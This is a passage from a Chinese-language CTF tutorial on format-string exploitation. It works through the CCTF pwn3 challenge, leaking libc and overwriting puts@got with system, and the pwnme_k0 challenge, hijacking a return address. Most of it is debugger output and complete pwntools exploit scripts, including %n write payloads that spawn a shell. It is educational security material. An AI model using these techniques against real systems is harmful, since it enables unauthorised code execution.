class="function"> </span></span><br><span class="line"><span class="function">   0x80488a3 &lt;get_file+173&gt;      leave  </span></span><br><span class="line"><span class="function">   0x80488a4 &lt;get_file+174&gt;      ret    </span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">   0x80488a5 &lt;get_command&gt;       push   ebp</span></span><br><span class="line"><span class="function">   0x80488a6 &lt;get_command+1&gt;     mov    ebp, esp</span></span><br><span class="line"><span class="function">   0x80488a8 &lt;get_command+3&gt;     sub    esp, 0x28</span></span><br><span class="line"><span class="function">   0x80488ab &lt;get_command+6&gt;     lea    eax, [ebp - 0xc]</span></span><br><span class="line"><span class="function">   0x80488ae &lt;get_command+9&gt;     mov    dword ptr [esp + 4], eax</span></span><br><span class="line"><span class="function">   0x80488b2 &lt;get_command+13&gt;    mov    dword ptr [esp], 0x8048bc5</span></span><br><span class="line"><span class="function">   0x80488b9 &lt;get_command+20&gt;    call   __isoc99_scanf@plt &lt;__isoc99_scanf@plt&gt;</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">   0x80488be &lt;get_command+25&gt;    mov    dword ptr [esp + 8], 3</span></span><br><span class="line"><span class="function">───────────────────────────────────[ STACK ]────────────────────────────────────</span></span><br><span class="line"><span class="function">00:0000│ esp      0xffffcec0 —▸ 0xffffcedc ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function">01:0004│          0xffffcec4 —▸ 0x804b598 ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function">02:0008│          0xffffcec8 ◂— 0x4</span></span><br><span class="line"><span class="function">03:000c│          0xffffcecc —▸ 0xf7de8f88 ◂— movsd  dword ptr es:[edi], dword ptr [esi]</span></span><br><span class="line"><span class="function">04:0010│          0xffffced0 ◂— 0xfbad2887</span></span><br><span class="line"><span class="function">05:0014│          0xffffced4 ◂— 0x7d4</span></span><br><span class="line"><span class="function">06:0018│          0xffffced8 —▸ 0<span class="title">xf7fb4220</span> <span class="params">(_IO_helper_jumps)</span> ◂— 0x0</span></span><br><span class="line"><span class="function">07:001c│ eax edx  0xffffcedc ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span></span><br><span class="line"><span class="function"> ► f 0  804889e get_file+168</span></span><br><span class="line"><span class="function">   f 1  80486c9 main+92</span></span><br><span class="line"><span class="function">   f 2 f7df6f21 __libc_start_main+241</span></span><br><span class="line"><span class="function">────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="function">pwndbg&gt; <span class="built_in">stack</span> 24</span></span><br><span class="line"><span class="function">00:0000│ esp      0xffffcec0 —▸ 0xffffcedc ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function">01:0004│          0xffffcec4 —▸ 0x804b598 ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function">02:0008│          0xffffcec8 ◂— 0x4</span></span><br><span class="line"><span class="function">03:000c│          0xffffcecc —▸ 0xf7de8f88 ◂— movsd  dword ptr es:[edi], dword ptr [esi]</span></span><br><span class="line"><span class="function">04:0010│          0xffffced0 ◂— 0xfbad2887</span></span><br><span class="line"><span class="function">05:0014│          0xffffced4 ◂— 0x7d4</span></span><br><span class="line"><span class="function">06:0018│          0xffffced8 —▸ 0<span class="title">xf7fb4220</span> <span class="params">(_IO_helper_jumps)</span> ◂— 0x0</span></span><br><span class="line"><span class="function">07:001c│ eax edx  0xffffcedc ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function">... ↓</span></span><br><span class="line"><span class="function">09:0024│          0xffffcee4 —▸ 0x8048c00 ◂— push   ebx <span class="comment">/* &#x27;Serv-U FTP Server v6.4 for WinSock ready...&#x27; */</span></span></span><br><span class="line"><span class="function">0a:0028│          0xffffcee8 —▸ 0<span class="title">xf7e511db</span> <span class="params">(_IO_file_underflow+<span class="number">11</span>)</span> ◂— add    edi, 0x164e25</span></span><br><span class="line"><span class="function">0b:002c│          0xffffceec —▸ 0xf7fb49f4 ◂— 0x0</span></span><br><span class="line"><span class="function">0c:0030│          0xffffcef0 —▸ 0<span class="title">xf7fb65c0</span> <span class="params">(_IO_2_1_stdin_)</span> ◂— 0xfbad2288</span></span><br><span class="line"><span class="function">0d:0034│          0xffffcef4 ◂— 0x1</span></span><br><span class="line"><span class="function">0e:0038│          0xffffcef8 —▸ 0x804b598 ◂— &#x27;qwerqwer&#x27;</span></span><br><span class="line"><span class="function">0f:003c│          0xffffcefc —▸ 0<span class="title">xf7e5034f</span> <span class="params">(__GI__IO_file_xsgetn+<span class="number">575</span>)</span> ◂— add    esp, 0x10</span></span><br><span class="line"><span class="function">10:0040│          0xffffcf00 —▸ 0x804b5a0 ◂— 0x0</span></span><br><span class="line"><span class="function">11:0044│          0xffffcf04 —▸ 0x804b168 ◂— 0xa <span class="comment">/* &#x27;\n&#x27; */</span></span></span><br><span class="line"><span class="function">12:0048│          0xffffcf08 ◂— 0x1</span></span><br><span class="line"><span class="function">13:004c│          0xffffcf0c —▸ 0xf7ffd940 ◂— 0x0</span></span><br><span class="line"><span class="function">14:0050│          0xffffcf10 —▸ 0xffffcf44 —▸ 0x804b5a0 ◂— 0x0</span></span><br><span class="line"><span class="function">15:0054│          0xffffcf14 —▸ 0<span class="title">xf7fb6000</span> <span class="params">(_GLOBAL_OFFSET_TABLE_)</span> ◂— 0x1d7d8c</span></span><br><span class="line"><span class="function">16:0058│          0xffffcf18 —▸ 0<span class="title">xf7fb4220</span> <span class="params">(_IO_helper_jumps)</span> ◂— 0x0</span></span><br><span class="line"><span class="function">17:005c│          0xffffcf1c —▸ 0xf7fb49f4 ◂— 0x0</span></span><br><span class="line"><span class="function">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出字符串偏移为7，接下来得到puts@got地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%8$s&#x27;</span> + p32(puts_got)</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">payload = p32(puts_got) + <span class="string">&#x27;%7$s&#x27;</span></span><br></pre></td></tr></table></figure><p>接下来接收puts函数的真实地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(puts_got) + <span class="string">&#x27;%7$s&#x27;</span></span><br></pre></td></tr></table></figure><p>由于我们使用的是本地的libc，所以挂载本地的libc就行了。查看一下程序在运行时使用的libc文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/ctf-challenges/pwn/fmtstr/2016-CCTF-pwn3$ ldd pwn3</span><br><span class="line">linux-gate.so.1 (0xf7f10000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d19000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7f11000)</span><br></pre></td></tr></table></figure><p>从上图可以看到真正用到的是”/lib/i386-linux-gnu/libc.so.6“这个库，所以把这个库载入进来就可以了：‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><p>接下来就是覆盖puts函数了，首先介绍下pwntools中的fmtstr_payload函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br><span class="line">第一个参数表示格式化字符串的偏移；</span><br><span class="line">第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT: systemAddress&#125;；本题是将0804a048处改为0x2223322</span><br><span class="line">第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</span><br><span class="line">第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</span><br><span class="line">fmtstr_payload函数返回的就是payload</span><br></pre></td></tr></table></figure><p>那么这道题中payload这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: sys_addr&#125;)</span><br></pre></td></tr></table></figure><p><strong>EXP：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">pwn3 = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tmp = <span class="string">&#x27;sysbdmin&#x27;</span></span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    name += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) - <span class="number">1</span>)</span><br><span class="line"><span class="comment">#登录密码：rxraclhm</span></span><br><span class="line">sh.sendline(name)</span><br><span class="line"><span class="comment">#通过puts函数把部署好的泄露任意地址的payload写进去</span></span><br><span class="line">puts_got = pwn3.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Cyberangel&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;then, enter the content:&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;%8$s&#x27;</span> + p32(puts_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#通过get泄露puts函数地址</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Cyberangel&#x27;</span>)</span><br><span class="line">puts_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="comment">#从库中找到system函数地址</span></span><br><span class="line">libc = ELF (<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#将第七个参数的puts函数地址改成system函数地址</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: sys_addr&#125;)</span><br><span class="line">sh.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)</span><br><span class="line"><span class="comment">#在运行show_dir时将puts(”/bin/sh;“)变成system(&quot;/bin/sh;&quot;),并成功获取shell</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;then, enter the content:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#通过get打印‘/bin/sh;’文件，执行system(&#x27;/bin/sh;&#x27;)</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;ftp&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"><span class="comment">#通过dir来拿到shell</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>最后总结下思路</p><ol><li>绕过密码</li><li>确定格式化字符串参数偏移</li><li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li><li>修改 puts@got 的内容为 system 的地址。</li><li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li></ol><h2 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p><h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>这里用的是<strong>三个白帽-pwnme_k0</strong>为例<br><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/三个白帽-pwnme_k0</a></p><p>checksek一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hacker@ubuntu:~/Desktop/ctf-challenges/pwn/fmtstr/三个白帽-pwnme_k0$ checksec pwnme_k0</span><br><span class="line">[*] <span class="string">&#x27;/home/hacker/Desktop/ctf-challenges/pwn/fmtstr/\xe4\xb8\x89\xe4\xb8\xaa\xe7\x99\xbd\xe5\xb8\xbd-pwnme_k0/pwnme_k0&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p>程序的大致就是注册账户之类的，下面代码存在漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400B07</span><span class="params">(<span class="keyword">char</span> format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="keyword">char</span> formata, __int64 a8, __int64 a9)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Welc0me to sangebaimao!\n&quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;formata, <span class="string">&quot;Welc0me to sangebaimao!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了字符串发现有可以直接利用的system(‘/bin/sh’),所以只要用格式化字符串漏洞直接修改某个函数的返回地址为0x4008A6就可以了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008A6 sub_4008A6      proc near</span><br><span class="line">.text:00000000004008A6 ; __unwind &#123;</span><br><span class="line">.text:00000000004008A6                 push    rbp</span><br><span class="line">.text:00000000004008A7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004008AA                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004008AF                 call    system</span><br><span class="line">.text:00000000004008B4                 pop     rdi</span><br><span class="line">.text:00000000004008B5                 pop     rsi</span><br><span class="line">.text:00000000004008B6                 pop     rdx</span><br><span class="line">.text:00000000004008B7                 retn</span><br></pre></td></tr></table></figure><p>在000400B39处下断点，，输入后s跟进printf，跟进去的话栈上第一个肯定就是返回地址，所以返回地址后跟着的句式参数7(offset 6)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x7fffffffdd44 ◂— &#x27;%p%p%p%p%p%p%p%p\n&#x27;</span><br><span class="line"> RSI  0x603260 ◂— &#x27;qwertyui\nngebaimao:(\ntion!\nth:20): \n**********\n&#x27;</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x7ffff7b502d0 (__memcpy_ssse3+7232) ◂— mov    rcx, qword ptr [rsi - 9]</span><br><span class="line"> R10  0x7ffff7b80c40 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4007b0 ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffdef0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffdd20 —▸ 0x7fffffffdd60 —▸ 0x7fffffffde10 —▸ 0x400eb0 ◂— push   r15</span><br><span class="line">*RSP  0x7fffffffdd18 —▸ 0x400b3e ◂— nop    </span><br><span class="line">*RIP  0x7ffff7a46f70 (printf) ◂— sub    rsp, 0xd8</span><br><span class="line">────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7a46f70 &lt;printf&gt;        sub    rsp, 0xd8</span><br><span class="line">    ↓</span><br><span class="line">   0x7ffff7a46f79 &lt;printf+9&gt;      mov    qword ptr [rsp + 0x28], rsi</span><br><span class="line">   0x7ffff7a46f7e &lt;printf+14&gt;     mov    qword ptr [rsp + 0x30], rdx</span><br><span class="line">   0x7ffff7a46f83 &lt;printf+19&gt;     mov    qword ptr [rsp + 0x38], rcx</span><br><span class="line">   0x7ffff7a46f88 &lt;printf+24&gt;     mov    qword ptr [rsp + 0x40], r8</span><br><span class="line">   0x7ffff7a46f8d &lt;printf+29&gt;     mov    qword ptr [rsp + 0x48], r9</span><br><span class="line">   0x7ffff7a46f92 &lt;printf+34&gt;     je     printf+91 &lt;printf+91&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7ffff7a46fcb &lt;printf+91&gt;     mov    rax, qword ptr fs:[0x28]</span><br><span class="line">   0x7ffff7a46fd4 &lt;printf+100&gt;    mov    qword ptr [rsp + 0x18], rax</span><br><span class="line">   0x7ffff7a46fd9 &lt;printf+105&gt;    xor    eax, eax</span><br><span class="line">   0x7ffff7a46fdb &lt;printf+107&gt;    lea    rax, [rsp + 0xe0]</span><br><span class="line">─────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp    0x7fffffffdd18 —▸ 0x400b3e ◂— nop    </span><br><span class="line">01:0008│ rbp    0x7fffffffdd20 —▸ 0x7fffffffdd60 —▸ 0x7fffffffde10 —▸ 0x400eb0 ◂— push   r15</span><br><span class="line">02:0010│        0x7fffffffdd28 —▸ 0x400d74 ◂— add    rsp, 0x30</span><br><span class="line">03:0018│        0x7fffffffdd30 ◂— &#x27;qwertyui\n&#x27;</span><br><span class="line">04:0020│        0x7fffffffdd38 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">05:0028│ rdi-4  0x7fffffffdd40 ◂— 0x7025702500000000</span><br><span class="line">06:0030│        0x7fffffffdd48 ◂— &#x27;%p%p%p%p%p%p\n&#x27;</span><br><span class="line">07:0038│        0x7fffffffdd50 ◂— 0xa70257025 /* &#x27;%p%p\n&#x27; */</span><br><span class="line">───────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0     7ffff7a46f70 printf</span><br><span class="line">   f 1           400b3e</span><br><span class="line">   f 2           400d74</span><br><span class="line">   f 3           400e98</span><br><span class="line">   f 4     7ffff7a03bf7 __libc_start_main+231</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p><strong>虽然存储返回地址的内存本身是动态变化的，但是其相对于rbp的地址并不会改变，所以我们可以使用相对地址来计算。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp    0x7fffffffdd18 —▸ 0x400b3e ◂— nop    （返回地址）</span><br><span class="line">01:0008│ rbp    0x7fffffffdd20 —▸ 0x7fffffffdd60 offset 6(因为格式化串是参数1，前6个参数存在寄存器里，所以这里是参数7，相对格式化串就是偏移6)</span><br><span class="line">02:0010│        0x7fffffffdd28 —▸ 0x400d74 ◂— add    rsp, 0x30</span><br><span class="line">03:0018│        0x7fffffffdd30 ◂— &#x27;aaaaaaaa\n&#x27;</span><br><span class="line">04:0020│        0x7fffffffdd38 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">05:0028│ rdi-4  0x7fffffffdd40 ◂— 0x7025702500000000</span><br><span class="line">06:0030│        0x7fffffffdd48 ◂— &#x27;%p%p%p%p%p%p\n&#x27;</span><br><span class="line">07:0038│        0x7fffffffdd50 ◂— 0xa70257025 /* &#x27;%p%p\n&#x27; */</span><br><span class="line">───────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0     7ffff7a46f70 printf</span><br><span class="line">   f 1           400b3e</span><br><span class="line">   f 2           400d74</span><br><span class="line">   f 3           400e98</span><br><span class="line">   f 4     7ffff7a03bf7 __libc_start_main+231</span><br></pre></td></tr></table></figure><p>这里的返回地址是printf的返回地址，这时rbp还没有变化，还未进入printf，所以rbp指向的是原来rbp的地址(old rbp)。所以当前返回地址是rbp+8，即0x400d74。</p><p>在0x7fffffffdd28这里存着，它相对于old rbp的地址就是：0x7fffffffdd60 - 0x7fffffffdd28 = 0x38</p><p>用格式化串先读offst 6，也就是0x7fffffffdd20，得到rbp地址：0x7fffffffdd60，再减去0x38就得到存储返回地址的内存地址是0x7fffffffdd28</p><p>然后就可以去覆盖这个地址存放的返回值为我们的system(‘/bin/sh’)即0x4008A6，即需要把400D74覆盖成4008A6，即：写成0x08A6 = 2214。</p><p>这里需要说明的是在某些较新的系统 (如 ubuntu 18.04) 上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash, 这时可以考虑修改返回地址为 0x00000000004008AA, 即直接调用 system(“/bin/sh”) 处，即2218</p><p>exp1：通过把 username 改成计算出来的 ret 的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#get retaddr</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">8</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;%6$p&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">retaddr = <span class="built_in">int</span>(io.recvline().strip(), <span class="number">16</span>) - <span class="number">0x38</span></span><br><span class="line"><span class="comment">#print &quot;retaddr = &quot; + hex(retaddr)</span></span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(p64(retaddr))</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;%2218d%8$hn&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>Exp2：在 password 后面跟上 ret 地址来修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwnme_k0&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwnme_k0&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">ret_addr = <span class="built_in">int</span>(p.recvline().strip(), <span class="number">16</span>) - <span class="number">0x38</span></span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span 